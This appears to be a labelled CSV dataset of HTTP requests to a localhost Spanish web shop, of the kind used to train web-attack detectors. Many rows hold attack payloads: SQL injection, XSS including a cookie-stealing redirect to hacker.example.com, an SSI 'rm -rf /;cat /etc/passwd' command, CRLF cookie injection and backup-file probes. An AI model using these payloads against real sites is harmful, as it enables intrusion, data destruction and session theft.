,request,label
2266,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=avictor&password=e5trell5&nombre=sebasti�n&apellidos=shley+rota&email=biliotti@juegois.aw&dni=43126997l&direccion=calle+melilla,+158,+&ciudad=fresno+de+caracena&cp=08650&provincia=la+rioja&ntc=1214776714358513&b1a=registrar",1
2267,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=1124&b1=pasar+por+caja,1
2268,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marceau&password=gallofar&nombre=reese&apellidos=echevarr�a+borras&emaila=shafer@comodindelhogar.ps&dni=91669228z&direccion=calle+ciudad+real+70+&ciudad=pinilla+de+toro&cp=18110&provincia=le�n&ntc=5498019386579273&b1=registrar,1
2269,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidada=28&b1=a�adir+al+carrito,1
2270,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=|&password=destruidor-a&nombre=antares&apellidos=pressel+goyenaga&email=klarwein@xavipetit.it&dni=83357480y&direccion=c/+las+americas+8+&ciudad=ponteceso&cp=24293&provincia=�lava&ntc=2255812100125453&b1=registrar,1
2271,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=suilin&password=654261itu2a&nombre=ran+gl'e&apellidos=llens+capmany&email=fleugel@tantomontamontatanto.lc&dni=31564707j&direccion=glorieta+liquidambar,+s/n,+13?f&ciudad=puebla+del+salvador&cp=24438&provincia=huelva&ntc=2227850098385549&b1=registrar",1
2272,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wing-man7&pwd=edific9r&remember=on&b1a=entrar,1
2273,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=ques+o+manchego&precio=85&cantidad=56&b1=a�adir+al+carrito,1
2274,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=uchida&password=g2r0n8u54&nombre=nariana&apellidos=hop-man-s&email=caba.colley@grandesinventos.mil&dni=12952733f&direccion=balandrau,+142+&ciudad=sant+juli�+de+vilatorta&cp=49325&provincia=teruel&ntc=4276436600422398&b1=registrar",1
2275,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2276,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=izique&password=48a6850ll3&nombre=otilia&apellidos=aliverti_+sanandre?u&email=divoka@mercadozoom.bf&dni=36504708m&direccion=calle+bolivia,+69,+&ciudad=avil�s&cp=22468&provincia=le�n&ntc=1926544477784446&b1=registrar",1
2277,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2278,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=meera&password=sensualidad&nombre=honoria&apellidosa=mitjavila+oca&email=pennington@lasexta-f1.bm&dni=22456953y&direccion=carolina+corolado,+38,+11?e&ciudad=castielfabib&cp=29170&provincia=madrid&ntc=6608769758873032&b1=registrar",1
2279,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=darbee&password=e9e142od6n�mi63&nombre=remigio&apellidos=maquieira+san+segundo&email=eure@cafedeteatro.no&dni=86138285l&direccion=calle+12+56+&ciudad=cubells&cpa=31454&provincia=alicante&ntc=0034994508490764&b1=registrar,1
2280,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&password=libreta&nombre=virtudes&apellidos=t�rtola+planelles&email=arnold-weck@santcugatpisos.gl&dni=75272191e&direccion=av.+mundia*l+82++13*+1-f&ciudad=guijo+de+coria&cp=23391&provincia=salamanca&ntc=7881123538069057&b1=registrar,1
2281,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&pwd=al*horre&remember=off&b1=entrar,1
2282,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=342&b1a=confirmar,1
2283,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100&cantidad=80&b1=a�adir+al+carritoparos%22%20style=%22background:url(javascript:alert('paros')),1
2284,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pic&password=emba?ulada&nombre=cruz&apellidos=puyal+catalan&email=eastside-luco@apicultor.ms&dni=39658514m&direccion=c/+don+juan+de+aguilar+168,+&ciudad=nava,+la&cp=31284&provincia=le�n&ntca=6217533099373869&b1=registrar",1
2285,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hatty&password=eb�rnea&nombre=norberto&apellidos=riu+riutort&email=demjanenko@gesautonomos.io&dni=33a75810q&direccion=cipriano+de+la+huerga,+45+&ciudad=fontiveros&cp=05146&provincia=baleares+(illes)&ntc=6216263942492348&b1=registrar",1
2286,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helem&password=aparecer&nombre=pancho&apellidos=goldaratz+brizuela&email=lahbib_hodo@silver-knights.ie&dni=54489862x&direccion=berlin+116+&ciudada=sudanell&cp=24346&provincia=burgos&ntc=3191456339688389&b1=registrar,1
2287,"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39&cantidad=84&b1=a�adir+al+carrito""+and+""1""=""1",1
2288,gethttp://localhost:8080/tienda1/asf-logo-wide.gif.inc,1
2289,gethttp://localhost:8080/webapp/examples/verify,1
2290,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=julienne&pwd=d2s8a2at0d0r,/a&remember=on&b1=entrar",1
2291,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=83&b1=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->",1
2292,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=3574&b1=pasar+por+caja,1
2293,gethttp://localhost:8080/tienda1/global/titulo.jsp/,1
2294,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=monaco&password=roznar&nombre=kiara&apellidos=palenzuela+usa&email=badland.paudler@dise�odesoftware.do&dni=86214709z&direccion=c/+alegria,+141,+12-h&ciudad=villanueva+de+oscos""+and+""1""=""1&cp=24735&provincia=ciudad+real&ntc=4654942357042652&b1=registrar",1
2295,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=c+/or/i&password=6s19r9u13o&nombre=ant�&apellidos=laris+ull&email=behrens0@professionalhost.tr&dni=28809888l&direccion=cami+la+parra+73+&ciudad=sella&cp=39587&provincia=madrid&ntc=5101738813776143&b1=registrar,1
2296,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=plsntp1&password=c!uartilludo&nombre=generosa&apellidos=obrador+scolari&email=metanee4@martosfutbolsala.us&dni=55023331v&direccion=cuesta+de+la+independencia+107+7?h&ciudad=bastida,+la&cp=50268&provincia=guadalajara&ntc=7559315491846404sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=registrar",1
2297,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=39&cantidad=91&b1=a�adir+al+carrito,1
2298,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja""><!--#exec+cmd=""dir+""--><&precio=85&cantidad=90&b1=a�adir+al+carrito",1
2299,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=izique&password=48a6850ll3&nombrea=otilia&apellidos=planelles+neris&email=divoka@mercadozoom.bf&dni=36504708m&direccion=calle+bolivia,+69,+&ciudad=avil�s&cp=22468&provincia=le�n&ntc=1926544477784446&b1=registrar",1
2300,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='+delete+from+users,1
2301,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=san??ks&password=aocar&nombre=romari&apellidos=astorga&email=laine-devlin@telogis.tl&dni=38236531c&direccion=carlos+maurras,+53+&ciudad=brazatortas&cp=47318&provincia=teruel&ntc=1539106035022120&b1=registrar",1
2302,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2303,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ivanyi0&password=va7e9ianato&nombre=ve*,r+na&apellidos=echevarr�a+borras&email=tadio.bixby@espaciopintor.eh&dni=98763423c&direccion=torrent+de+can+quintana,+179,+&ciudad=llocnou+de+la+corona&cp=49430&provincia=lleida&ntc=8110791105529474&b1=registrar",1
2304,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.inc,1
2305,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2306,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2307,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=39&cantidad=59&b1=a�adir+al+carrito,1
2308,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=iolanthe&password=vortiginosa&nombre=bulmaro&apellidos=castelazo+cuadros&email=aidman@silver-knights.tj&dni=83201516m&direccion=calle+dulzaina+119+1c&ciudad=curiel+de+duero&cp=45140&provincia=/c*uenca&ntc=9082133825595036&b1=registrar,1
2309,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2310,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=trahan'+and+'1'='1&pwd=72513662r719&remember=off&b1=entrar,1
2311,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727,1
2312,gethttp://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif~,1
2313,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=adebayo&pwd=pedral&remember=+&b1=entrar,1
2314,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=benefielsessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&pwd=duc9i89&remember=on&b1=entrar,1
2315,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=|,1
2316,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2317,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lonnard&password=matalah�va&nombre=hortencio&apellidos=lloreda+nuda&email=stratton_buntic@madrid2012.my&dni=21034297s&direccion=calle+arquitecto+vicente+traver,+s/n,+&ciudad=alcolea+del+r�o&cpa=10440&provincia=lleida&ntc=7508050923108399&b1=registrar",1
2318,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vanderbi&password=brechar&nombre=rudolph&apellidos=simo+baixaul�&email=guarneros@elfisioencasa.eu&dni=07929654j&direccion=d'+irlanda,+150,+4g&ciudada=cru�lles,+monells+i+sant+sadurn�+de+l'heura&cp=22362&provincia=palencia&ntc=7146200335863301&b1=registrar",1
2319,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2320,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=barrell&password=bu70nvil2a&nombre=aristarco&apellidos=porflit+strick&email=holton@enigmatico.vu&dni=91802907v&direccion=cal*le+colonia+militar+1*78,+&ciudad=robladillo&cp=31498&provincia=asturias&ntc=2382356887659758&b1=registrar",1
2321,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.bak,1
2322,gethttp://localhost:8080/samples/sampsite/catalog.htm,1
2323,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasany%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
2324,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7095&b1=confirmar/,1
2325,gethttp://localhost:8080/msadc/samples/selector/showcode.asp,1
2326,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lendon&pwd=t$,,arsa'na&remember=on&b1=entrar",1
2327,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=torok&password=03f3so&nombre=noel+stefani&apellidos=vilaseca+regalado&email=howell@zarasalud.mw&dni=17400980p&direccion=duran+i+*borrell,+22++3?d&ciudad=fontiveros&cp=49254&provincia=guadalajara&ntc=4507218709160906&b1=registrar",1
2328,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wendi&pwd=tracam/unda''na&remember=on&b1=entrar,1
2329,gethttp://localhost:8080/iissamples/sdk/asp/database/limitrows_vbscript.asp,1
2330,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sysint9&pwd=l2n7at8s55&remember=on&b1=entrar+,1
2331,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=raymund&pwd=pist�n&remember=on&b1=entrar,1
2332,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5902&b1=confirmar/,1
2333,gethttp://localhost:8080/tienda1/miembros/index.jsp/4861362529278789730.bak,1
2334,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3650&b1a=confirmar,1
2335,gethttp://localhost:8080/tienda1/index.jsp/6909030637832563290.jsp,1
2336,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=@40&b1=a�adir+al+carrito,1
2337,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chrisy&password=7n3i083zo&nombre=tom�s&apellidos=mares+mulleras&email=aylmer@pisossantcugat.pl&dni=04472501j&direccion=gravina+197+3?h&ciudad=calzadilla+de+tera&cp=46827&provincia=cuenca&ntc=7996895110966395&b1a=registrar,1
2338,gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp.java,1
2339,gethttp://localhost:8080/tienda1/6909030637832563290.jsp.bak,1
2340,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=vino+rioja&precio=39&cantidad=66&b1=a�adir+al+carrito,1
2341,gethttp://localhost:8080/asf-logo-wide.gif/,1
2342,gethttp://localhost:8080/tienda1/6909030637832563290.jsp,1
2343,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=vino+rioja&precio=100&cantidad=98&b1=a�adir+al+carrito,1
2344,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9874&b1=pasar+por+caja/,1
2345,gethttp://localhost:8080/asf-logo-wide.gif,1
2346,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=detlef6&password=garr�n&nombre=vigilio&apellidos=alcantara+campanin&email=padamsee@comodindelhogar.no&dni=71599604y&direccion=|&ciudad=cigu�uela&cp=25737&provincia=palencia&ntc=7263738765493624&b1=registrar,1
2347,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasany%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
2348,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=""+and+""1""=""1",1
2349,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidada=84&b1=a�adir+al+carrito,1
2350,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85|&cantidad=67&b1=a�adir+al+carrito,1
2351,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5949?&b1=confirmar,1
2352,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/6909030637832563290.jsp.inc,1
2353,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=33&b1a=a�adir+al+carrito,1
2354,gethttp://localhost:8080/tienda1/miembros/6909030637832563290.jsp,1
2355,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=bob@<script>alert(paros)</script>.parosproxy.org,1
2356,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=ques+o+manchego&precio=39&cantidad=21&b1=a�adir+al+carrito,1
2357,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2358,gethttp://localhost:8080/iissamples/sdk/asp/database/limitrows_vbscript.asp,1
2359,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=defalco&password=botones&nombre=suyai&apellidos=r�bago+patraca&email=bonos8@puravidasa.d@o&dni=24778234n&direccion=c/+la+salpa+104,+&ciudad=moral+de+la+reina&cp=10334&provincia=burgos&ntc=5823821605242067&b1=registrar",1
2360,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/,1
2361,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rourke&password=bil'leta'je&nombre=yulisa&apellidos=atondo+kan&email=oak@cpanelhost.com.be&dni=29170567n&direccion=c/+driza,+63+11-d&ciudad=fuensalda�a&cp=02461&provincia=�vila&ntc=6074458836046165&b1=registrar",1
2362,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=riccitel&pwd=apriscar&remember=on&b1=entrar%20,1
2363,gethttp://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif.bak,1
2364,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nolter&pwd='+and+'1'='1&remember=off&b1=entrar,1
2365,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ettson&password=6a86q3is2o&nombre=quinto&apellidos=corominas+corcoy&email=omiya_bogetti@casablancabeach.goband+1=1&dni=03995650k&direccion=c/+reyes+magos+130,+&ciudad=nuevo+bazt�n&cp=07191&provincia=zamora&ntc=1916434162940533&b1=registrar",1
2366,gethttp://localhost:8080/asf-logo-wide.inc,1
2367,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2368,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas+,1
2369,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kamran&password=+sacio&nombre=bladimiro&apellidos=barreda+icaza&email=cserhalmi@ankawaelda.net&dnia=41585257s&direccion=c/+rossello+154+13-h&ciudad=atez&cp=31264&provincia=cantabria&ntc=9078165703256769&b1=registrar,1
2370,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=donnelly&password=14a8u19lero&nombre=alessandra&apellidos=ricom�+morato&email=gambold@fok.so&dnia=66367222d&direccion=calle+cavallers+63+&ciudad=tocina&cp=03729&provincia=valladolid&ntc=2169388539628734&b1=registrar,1
2371,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2372,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lodesert&password=herramienta&nombre=edelmira&apellidos=capo+garc�a&email=bugbee@farma-job.cd&dni=55645514g&direccion=c/+santander+s/n,+&ciudad=roca+de+la+sierra,+la&cp=05289&provincia=badajoz&ntc=686788257238725&b1=registrar",1
2373,gethttp://localhost:8080/tienda1/miembros/index.jsp.old,1
2374,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
2375,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8036&b1=pasar+por+caja/,1
2376,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=vivek&pwd=muletillera&remember=on&b1=entrar,1
2377,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=diffie&pwd=cayar�&remember=off&b1=entrar'injected_param,1
2378,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=8041&b1=pasar+por+caja,1
2379,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2any%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
2380,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=turbes&password=3r2667�3&nombre=isra�l&apellidos=orteu&email=greenlees@stainless.edu&dni=32080082g&direccion=lugar+capela+138,+&ciudad=valderrodrigo&cp=43718any%0aset-cookie%3a+tamper%3d1041264011025374727&provincia=teruel&ntc=2710524959634714&b1=registrar",1
2381,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precioa=39&cantidad=4&b1=a�adir+al+carrito,1
2382,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1';waitfor+delay+'0:0:15';--,1
2383,gethttp://localhost:8080/tienda1/imagenes/logo.gif/4861362529278789730~,1
2384,gethttp://localhost:8080/tienda1/imagenes/2.gif/.old,1
2385,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8699&b1=confirmar/,1
2386,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7716&b1=confirmar+,1
2387,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=levis&pwd=8scualide6&remember=off&b1=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
